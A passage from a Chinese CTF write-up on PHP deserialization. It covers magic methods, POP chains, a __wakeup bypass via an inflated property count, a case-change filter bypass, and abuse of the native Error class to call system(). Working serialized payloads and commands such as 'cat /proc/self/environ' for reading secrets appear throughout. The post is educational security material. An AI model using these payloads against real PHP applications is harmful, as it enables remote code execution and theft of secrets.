class="hljs-variable">$a</span>-&gt;args = <span class="hljs-string">&quot;calc.exe&quot;</span>;<br><br><span class="hljs-variable">$test</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-variable">$test</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230404125943007.png"></p>
<p>执行calc.exe，说明存在漏洞。更改$a-&gt;args的值，发现flag存在于环境变量中：</p>
<p>$a-&gt;args &#x3D; “env”;</p>
<p>(Linux的环境变量也可以通过查看根目录下文件&#x2F;proc&#x2F;self&#x2F;environ：$a-&gt;args &#x3D; “cat &#x2F;proc&#x2F;self&#x2F;environ”)</p>
<p>POST传入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload=fTsidm5lIjozOnM7InNncmEiOjQ6czsibWV0c3lzIjo2OnM7ImVtYU5jbnVmIjo4OnN9ezowOiJCIjoxOk87ImVtYU5zc2FsYyI6OTpzezozOiJBIjoxOk8=<br></code></pre></td></tr></table></figure>

<p>本题顺便复习了下___call()以及___destruct()魔术方法的使用方法：</p>
<h3 id="call"><a href="#call" class="headerlink" title="__call():"></a>__call():</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-variable">$method</span>,<span class="hljs-variable">$arg_array</span>);<span class="hljs-comment">//调用一个未定义的方法的时候调用。当调用当前对象不存在的方法时，转向__call()</span><br></code></pre></td></tr></table></figure>

<p>也就是说，如果test()方法未定义，那么test这个方法就会作为__call()的第一个参数传入，而test的参数会被装进数组中作为__call()的第二个参数传入。所以当调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$foo</span>-&gt;<span class="hljs-title function_ invoke__">test</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-number">3.4</span>,<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure>

<p>时，实际是相当于调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$foo</span>-&gt;<span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-number">3.4</span>,<span class="hljs-literal">true</span>));<br></code></pre></td></tr></table></figure>

<p>本题中B类中$funcName未定义，那么在A类中调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$class</span>-&gt;<span class="hljs-variable">$funcName</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br></code></pre></td></tr></table></figure>

<p>时，A::$funcName就会被传入B类__call()中的$func，A::$args传入B类的$arg，而$arg[0]就是字符串”calc.exe”。</p>
<p>在B中转向执行__call()也就是B::$func(B::arg[0]);也就是system(“calc.exe”);</p>
<h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct():"></a>__destruct():</h3><p>类的析构函数，在销毁一个类之前执行一些操作。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#声明格式：</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">//TODO</span><br>&#125;<br><span class="hljs-comment">#注意：析构函数不能带有任何参数</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#举例演示：</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sex</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$sex</span>=<span class="hljs-string">&quot;男&quot;</span>,<span class="hljs-variable">$age</span>=<span class="hljs-number">22</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;sex=<span class="hljs-variable">$sex</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(<span class="hljs-params"></span>)#构造说话方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我叫：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name.<span class="hljs-string">&quot;，性别：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;sex.<span class="hljs-string">&quot;，年龄：&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)#声明一个析构方法</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我觉得我还可以再抢救一下，我的名字叫&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小明&quot;</span>);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable">$Person</span>);<span class="hljs-comment">//销毁上面创建的对象$Person</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#我觉得我还可以再抢救一下，我的名字叫小明</span><br></code></pre></td></tr></table></figure>

<h3 id="construct"><a href="#construct" class="headerlink" title="__construct():"></a>__construct():</h3><p>构造函数，使用new关键字实例化一个对象的时候构造函数自动调用。一个类中只能存在一个构造函数。与析构函数不同的是__construct()可以带有参数（可选，不需要时可以省略），如果构造函数有参数的话，在实例化对象时也要传入对应的参数，例如上述destruct()方法示例中的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小明&quot;</span>);<br><span class="hljs-comment">//也可以将上例中的__construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=22)参数的值进行修改，随意改，最终参数的值只看实例化传入的，</span><br><span class="hljs-comment">//例如构造函数声明和类Person实例化如下：</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>=<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$sex</span>=<span class="hljs-string">&quot;男&quot;</span>,<span class="hljs-variable">$age</span>=<span class="hljs-number">22</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;sex=<span class="hljs-variable">$sex</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age=<span class="hljs-variable">$age</span>;<br>    &#125;<br>......<br><span class="hljs-variable">$Person</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;小红&quot;</span>,<span class="hljs-string">&quot;女&quot;</span>，<span class="hljs-number">23</span>);<br>......<br><span class="hljs-comment">//则最后运行结果为</span><br><span class="hljs-comment">//我叫：小红，性别：女，年龄：23</span><br></code></pre></td></tr></table></figure>

<p>如果没有在代码中显示地声明构造函数，类中会默认存在一个没有参数列表并且内容为空的构造函数。如果显示地声明了构造函数则类中的默认构造方法将不会存在。所以构造函数通常用来做一些准备工作，比如为某些参数赋值。</p>
<p><em><strong>注意：如果显示地声明构造函数，那么它的访问权限必须是public，而且构造函数是在实例化时自动调用的，我们不需要手动调用。</strong></em></p>
<hr>
<h2 id="2023ROIS冬令营week4-babyphp"><a href="#2023ROIS冬令营week4-babyphp" class="headerlink" title="2023ROIS冬令营week4 babyphp"></a>2023ROIS冬令营week4 babyphp</h2><p>这题综合性比较强，考察了挺多方面的东西的（大哭</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;left = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;right = <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;:)&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>开局直接一波代码审计。先看后端代码，是反序列化，很明显是希望执行backdoor()后门来进行rce，执行backdoor()方法就要执行popko类里的__call()方法，执行popko里的__call()方法就要调用一个未定义的方法，再往下看发现pipimi类中a类和a方法均未定义，pop链就比较明显了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pipimi::<span class="hljs-title function_ invoke__">__destruct</span>() =&gt; popko::<span class="hljs-title function_ invoke__">__call</span>() =&gt; <span class="hljs-title function_ invoke__">backdoor</span>()<br></code></pre></td></tr></table></figure>

<p>再看__call()方法下的规则</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">$this</span>-&gt;left != <span class="hljs-variable language_">$this</span>-&gt;right) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;right)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;left) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;right))) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;backdoor is here&quot;</span>;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>要求popko类中的$left和$right不相同但是md5编码和sha1编码强比较相同，因此popko-&gt;left和popko-&gt;right均为数组</p>
<p>编写poc：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">popko</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$left</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$right</span>;<br><br><span class="hljs-comment">//    public function __destruct()</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>            <span class="hljs-title function_ invoke__">backdoor</span>();<br>    &#125;<br><br>    <span class="hljs-comment">#public function __wakeup()</span><br>    <span class="hljs-comment">#&#123;</span><br>    <span class="hljs-comment">#    $this-&gt;left = &quot;&quot;;</span><br>    <span class="hljs-comment">#    $this-&gt;right = &quot;&quot;;</span><br>    <span class="hljs-comment">#&#125;</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pipimi</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">a</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">popko</span>();<br><span class="hljs-variable">$pop</span>-&gt;left=[<span class="hljs-number">1</span>];<br><span class="hljs-variable">$pop</span>-&gt;right=[<span class="hljs-number">2</span>];<br><span class="hljs-variable">$pip</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pipimi</span>();<br><span class="hljs-variable">$pip</span>-&gt;a=<span class="hljs-variable">$pop</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pip</span>);<br></code></pre></td></tr></table></figure>

<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406153731384.png"></p>
<p>漏洞存在，注意到popko类中的__wakeup()方法若执行会将left和right的值清空，_call()方法体的条件无法满足因此要绕过__wakeup()方法，</p>
<p>将生成的exp进行修改：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br><span class="hljs-comment">//将popko的对象数2改为比2大的数</span><br>O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>注意到函数主体部分有判断语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>strrstr()函数区分大小写，但是php类不区分大小写，进行大写绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>

<p>GET传入c</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406170242128.png"></p>
<p>进入后门后查看backdoor()函数体：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>$a是一个类，向类$a中传入参数$b返回值赋值给$class。但是并未定义这样一个满足条件的类，这时候就要去学习php原生类的知识了。查找到原生类ERROR。</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406171445334.png"></p>
<p>可以看到返回值前面几个字符为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span>: <span class="hljs-number">12345</span><span class="hljs-comment">#注意引号和字符串&quot;12345&quot;之间有个空格</span><br></code></pre></td></tr></table></figure>

<p>目的就很明确了，$a为ERROR原生类，$b为一个由命令执行函数和执行的命令组成的字符串。$d和$e代表命令执行函数在ERROR返回值中的首位置和命令执行函数的长度，$f和$g代表所执行的命令在ERROR返回值中的首位置和长度进行截取。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;ERROR&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;systemls&quot;</span><br><span class="hljs-comment">#此时error返回Error: systemls，其中s位于第七个位置，&quot;system&quot;长度6，同理，l位于13，&quot;ls&quot;长度2，则</span><br><span class="hljs-variable">$d</span> = <span class="hljs-number">7</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">6</span>;<br><span class="hljs-variable">$f</span> = <span class="hljs-number">13</span>;<br><span class="hljs-variable">$g</span> = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure>

<p>GET传入a、b、d、e、f、g对应的值。</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406172912264.png"></p>
<p>命令执行成功了。</p>
<p>对b、d、e、f、g进行修改，发现根目录下存在flag。</p>
<p><img src="/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230406173119381.png"></p>
<p>最终payload：</p>
